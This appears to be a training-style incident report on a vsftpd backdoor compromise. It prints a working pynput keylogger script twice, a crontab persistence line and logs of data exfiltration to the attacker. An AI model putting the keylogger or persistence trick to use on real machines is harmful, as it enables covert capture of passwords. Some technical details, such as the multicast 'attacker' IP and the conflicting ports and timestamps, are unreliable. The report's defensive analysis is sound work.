# Incident Report - Madrid Logistics
## Executive Summary
CVE 2011- 2523 (vsftpd reverse shell backdoor) was exploited after hours at the logistics company Madrid Logistics, allowing an attacker to enter a vulnerable security team machine as a user, exfiltrate data, and create a script that allowed them to track keystrokes. This was due to an outdated service. The analyst on duty quickly responded to the IDS alert about unusual traffic patterns, blocking the IP and isolating the affected machine for further remediation. All malicious processes were wiped from the system and filters were put into place only allowing trusted traffic. Regular scans of systems have been implemented and scheduled to ensure systems and services are quickly updated when necessary.
## Incident Report - August 13 2025
### Detection
At 23:36:49 CET the Intrusion Detection System (IDS) connected to the security team network detected a reverse shell connection from a security team machine Linux Ubuntu 22.04 LTS with IP 187.156.1.47 to suspicious IP 225.1.1.57. The IDS signaled this as a suspicious IP at non-business hours.
### Investigation
- 23:48:51 CET analyst confirms non-whitelisted address
- Analyst checks logs in /var/log/syslog and /var/log/auth.log
- 3 logs of interest
```bash
Aug 13 23:37:49 hostname vsftpd[6200]: [NOTICE] FTP session opened for user 'ftp' from 225.1.1.57
Aug 13 23:38:16 hostname kernel: [123456.789012] OUTBOUND: 187.156.1.47:21 -> 225.1.1.57:4444, 150MB transferred
Aug 13 23:39:48 hostname systemd[1]: Started /usr/bin/python3 /tmp/security.py
```
- Attacker gained access through a vfstpd vulnerability which affects a server that runs FTP (file transfers).
- 150MB data transfer from host to malicious IP. The malicious actor ran a python script called security, which upon review included the following (apparent keylogger):
```python
import pynput
import logging
import os
# Set up logging
log_file = os.path.expanduser("~") + "/security.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
# Function to log keystrokes
def on_press(key):
    try:
        logging.info('Key pressed: {0}'.format(key.char))
    except AttributeError:
        logging.info('Special key pressed: {0}'.format(key))
# Function to start the keylogger
def start_keylogger():
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
```
- further crontab job found:
```bash
@reboot /usr/bin/python3 /tmp/security.py &
```
- And confirmed that this was entered as a cronjob around the same time:
```bash
Aug 13 23:41:00 hostname CRON[6789]: (user) CMD (/usr/bin/python3 /tmp/security.py &)
```
- The attacker appeared to have put this as a crontab upon reboot so that it would survive through any shutdowns or updates. It is important to note that the attacker did not appear to escalate to root.
## Containment
-23:45:44 begin containment +escalate to upper level SOC
- Copied relevant logs to not tip off attacker
-Blocked the suspicious IP 225.1.1.57 using the firewall
-Place machine in VLAN and whitelist only sec and forensics teams
-Disable all privileged user accounts
-Closed the following ports:
1. 6200- FTP (entry point for the vsftpd attack)
2. 20 – FTP transfer (also relevant to FTP)
3. 22 - SSH (may be used for remote control)
4. 23 – Telnet (known insecure port)
5. 80/443 – HTTP/S (temporarily to ensure no exploitation of web vulnerabilities)
## Remediation
### 00:30:25  – Forensics team images all system logs
- Wipe security.py and cronjob
- Firewall filtered all aforementioned vulnerable ports, whitelisted trusted IPs
### 01:01:56 -  Analyze OpenVAS report
- Patched CVE-2011-2523 (vsftpd backdoor) – upgrade to latest version
- Further block nonstandard ports/filter standard ports presented with high risk
 (Appendix 1.1)
### Aug 17
- 11:30:42 – first phising/social engineering employee training held, scheduled quarterly
### Aug 19
- 2:01:09 – stakeholder meeting held to explain breach and explain implications
## Lessons Learned
- Always be proactive from OpenVAS and threat intelligence reports, specifically in patching
- Regular updates to systems and services to ensure security features most up to date
- Continue to respond quickly to IDS alerts and strong training in containment
- Consistent log and traffic monitoring
- Forensic preservation vital in aftermath/legal proceedings
## Systems Affected
- Host/system role affected:  Linux Ubuntu 22.04 LTS workstation with IP 187.156.1.47 (hostname “Security 2”
- Attacker: Kali Linux machine with IP 225.1.1.57
- Exposed services:
1. vsftpd (File Transfer Protocol)
2. Port 6200 (entry port)
3. Port 20 (FTP port used to move data with vsftpd)
4. Ports 22, 23, 80, 443 (not directly attacked but exposed due to entry with reverse shell)
5. Privileged accounts in security department (shut down for safety)
user FTP (used to open session)
## Root Cause Analysis
The underlying vulnerability exploited was CVE-2011-2523 also known as vsftpd Compromised Source Packages Backdoor Vulnerability with a 9.8 severity score (Appendix 1.2). This was noted by scanning the workstation IP using OpenVAS. This vulnerability arose because developers put backdoors in certain versions of vsftpd. Attackers can send carefully crafted FTP requests in order to enter this backdoor and create a reverse shell. This CVE is rated 9.8 because it does not require any authentication nor user interaction in the victim machine. This exploit represents an outdated version of the vsftpd service.  The first log entry that signaled entry was as follows:
```bash
Aug 13 23:37:49 hostname vsftpd[6200]: [NOTICE] FTP session opened for user 'ftp' from 225.1.1.57.
```
This log indicates that the attacker was able to gain a reverse shell (session opened through FTP, which is the protocol that vsftpd uses) through vsftpd.
Because the user had gained command-line access, they were able to then browse directories and begin exfiltrating data, seen by the log entry:
```bash
Aug 13 23:38:16 hostname kernel: [123456.789012] OUTBOUND: 187.156.1.47:21 -> 225.1.1.57:4444, 150MB transferred
```
Further, since they were essentially an unprivileged user in the eyes of the machine, they were then able to enter in the crontab and establish a script for persistence upon reboot. This breach was both technical and procedural. It is technical because the attacker exploited an outdated service directly. Outbound connections were not secured nor were nonstandard ports blocked. It is also procedural because nontrusted IP addresses were not blacklisted.
## Indicators of Compromise (IoCs)
### IP addresses linked:
- 187.156.1.47 (security workstation)
- 225.1.1.57 (attacker IP)
### Log entries
```bash
Aug 13 23:37:49 hostname vsftpd[6200]: [NOTICE] FTP session opened for user 'ftp' from 225.1.1.57  #log showing gained entry with reverse shell
Aug 13 23:38:16 hostname kernel: [123456.789012] OUTBOUND: 187.156.1.47:21 -> 225.1.1.57:4444, 150MB transferred #data exfiltration in progress
Aug 13 23:39:48 hostname systemd[1]: Started /usr/bin/python3 /tmp/security.py #started keylogger script
Aug 13 23:41:00 hostname CRON[6789]: (user) CMD (/usr/bin/python3 /tmp/security.py &)   #confirmation that cronjob was entered into crontab for persistence
Rogue processes:
@reboot /usr/bin/python3 /tmp/security.py & #crontab script to run keylogger upon reboot
```
### Scripts
```python
import pynput
import logging
import os
# Set up logging
log_file = os.path.expanduser("~") + "/security.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to log keystrokes
def on_press(key):
    try:
        logging.info('Key pressed: {0}'.format(key.char))
    except AttributeError:
        logging.info('Special key pressed: {0}'.format(key))
# Function to start the keylogger
def start_keylogger():
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()
if __name__ == "__main__":
    start_keylogger()
#keylogging script to record every keystroke made on the machine
```
## Threat Intelligence Integration
This vulnerability is well documented and is described in databases such as Rapid7, Exploit DB and Ubuntu advisories (Appendix 1.3). They describe the threat in detail and provide resources on newer versions that patch the vulnerability.
Looking at MITRE:
### T1590 Gather Victim Network Information
It is possible that the attacker used OSINT to find an IP of the security network and then scan the subnet for recon. They then were able to identify the vsftpd vulnerability using nmap service version.
### T1190 Exploit Public-Facing Application
The attacker was able to use this reconnaisance about services that would come up on a public-facing scan to launch their attack. They used Metasploit to craft an exploit that would allow them to create the backdoor and further exfiltrate data.
### T1053 Scheduled Task/Job
The analyst found that a cronjob was created to run the security.py keylogger every time upon reboot. This establishes persistence because the job will survive any reboots or updates and it is generally hidden among other processes.
### T1056 Input Capture
The attacker created a keylogging script that would run from security.py. This would allow them to capture everything typed on the machine, which could be used to capture login information and other sensitive data.
### T1048 Exfiltration over Alternative Protocol
The reverse shell was created using the vsftpd vulnerability which is connected to the FTP service, which is one MITRE lists as an alternative channel. Data was exfiltrated via this protocol.
## Containment Actions
The analyst first made sure to copy all the evidence (including logs and scripts mentioned previously) to ensure not to tip the attacker off and allow them to destroy data.
He then blocked the suspicious IP 225.1.1.57 using the firewall so that the attacker could not continue to access the network and potentially escalate or move laterally more. The analyst then placed the attacked machine in a VLAN (virtual local area network) and set up a whitelist such that only users from the security and forensics teams could access the machine. This virtually fences the machine off from successive attacks and lateral movement/privilege escalation while also preserving evidence for future forensics investigations. This was done because it posed minimal disruption to business operations (given it was during the night and off-work hours) and there was active data leakage.
With the machine frozen securely and the attacker IP blocked, the analyst immediately escalated the incident to the upper levels of the security team to inform relevant stakeholders. Next, he checked the machine once more to ensure all relevant logs were preserved for forensics testing.
Since the attacker almost certainly exfiltrated data, the analyst disabled all privileged user accounts on the machine. In the case that the malicious actor was able to get back into the machine, this would ensure that they can not escalate to root and harvest more credentials or carry out stronger attacks.
With the situation more under control and the machine isolated, the analyst then began to block off vectors that could be exploited again. He closed the following ports:
- 21- FTP (entry point for the vsftpd attack)
- 20 – FTP transfer (also relevant to FTP)
- 22 - SSH (may be used for remote control)
- 23 – Telnet (known insecure port)
- 80/443 – HTTP/S (temporarily to ensure no exploitation of web vulnerabilities)
This ensures that the attacker cannot try to launch another attack through a similar vector such as an open port.
## Remediation Steps
The attacker left behind the malicious script security.py (which was shown to be a keylogger) as well as a cronjob which allowed it to run upon every reboot. The forensics team first created images of the affected system and all logs to comply with any legal action down the line. Next, they fully wiped the aforementioned artefacts to ensure there is no chance of exploitation again.
The firewall was further configured to filter all aforementioned vulnerable port traffic only to whitelisted IP addresses.
The team then looked to intelligence reports to further build context. The OpenVAS report showed that this was a critical 9.8 vulnerability (Appendix 1.1), and many advisories such as Ubuntu, Red Hat, Exploit DB and Rapid7 have detailed documentation on how it is exploited (Appendix 1.3). The team was quick to update vsftpd to its newest version to prevent any outdated software exploits, given this is exploited often in the wild.
Next, the team blocked all nonstandard ports and filtered all standard ports such that they would only be accessible to whitelisted IP addresses.
Quarterly phishing and social engineering training sessions were scheduled for employees to ensure a lower chance of a human-related breach. Security posture in networks and devices can be strong, but it is critical to ensure employees are able to spot and report social engineering attempts. Lastly, the findings were brought to upper management and business stakeholders. The following related to business continuity was emphasized:
Such breaches give user access to attackers and then can extract sensitive data such as customer information and financial records
This may cause compliance issues (leading to financial penalties) as well as reputation hits, which will hurt business and trust in the brand.
Such incidents also take time and money to remediate, limiting the security team’s ability to respond to other, potentially more costly threats
This meeting attempted to relay the information to non-technical stakeholders and emphasize business impacts.
## Lessons Learned
One of the main reasons that this vulnerability was exploited was because of poor patch management and threat intelligence integration. There was sufficient information (both in the OpenVAS report and through various exploit databases (see Appendix 1.2 and 1.3) to realize both the theoretical and active threat in the wild posed by this vulnerability. It is critical going forward that a consistent scanning and patch management schedule be introduced. Quarterly OpenVAS credentialed scans should be carried out and combined with threat intelligence analysis (produced in actionable reports) in order to stay on top of vulnerabilities that may be being exploited in that moment. These reports with threat intelligence should be used with CVEE scores to determine contextual threats to the organization. Such critical threats should be patched quickly (in 48 hours), especially if they are being actively exploited in the wild. Further, scripts that automate updates in services in systems should be introduced in security machines, such as one that automatically updates and upgrades Linux upon every reboot. This also ensures that misconfigurations or outdated software cannot be further exploited. Some positives included rapid response to the incident and preserving evidence. The analyst on duty after-hours was able to quickly identify the threat using IDS and move to containment immediately. He made sure to preserve all log evidence for the forensics team and freeze the machine in its original state. This is critical for investigation down the line should it be needed for legal proceedings. His response should be used as an example and incident response playbooks should be regularly reviewed annually or after an incident. This ensures the team is trained and ready to respond quickly and mitigate damage.
## Recommendations
- OpenVAS credentialed vulnerability scans every quarter. Combine with threat intelligence feeds and produce and actionable report that lists critical vulnerabilities in their context (i.e., higher priority if high exploitability and being actively targeted in that moment)
- Patch all found vulnerabilities/outdated services within 48 hours – can streamline with automated patch management tools such as NinjaOne
- Automate updates of security machines with scripts
- Introduce comprehensive penetration tests once a year or after major architecture changes
- Automate compliance checks with tools such as RSA Archer/IBM QRadar to lessen risk of penalties due to outdated software/security practices
- Create network segmentation by department to ensure attackers cannot laterally move across systems 
- Create a whitlist of trusted IP addresses and only allow traffic from these to bypass firewall and access internal ports
## Appendix
### 1.1 Discovery of vulnerable ports on OpenVAS
[Appendix 1.1.1](appendix11.png)
[Appendix 1.1.2](appendix112.png)
### 1.2 OpenVAS Report on the vsftpd vulnerability
[Appendix 1.2](appendix12.png)
### 1.3 Rapid7 example advisory on the vulnerability
[Appendix 1.3](appendix13.png)





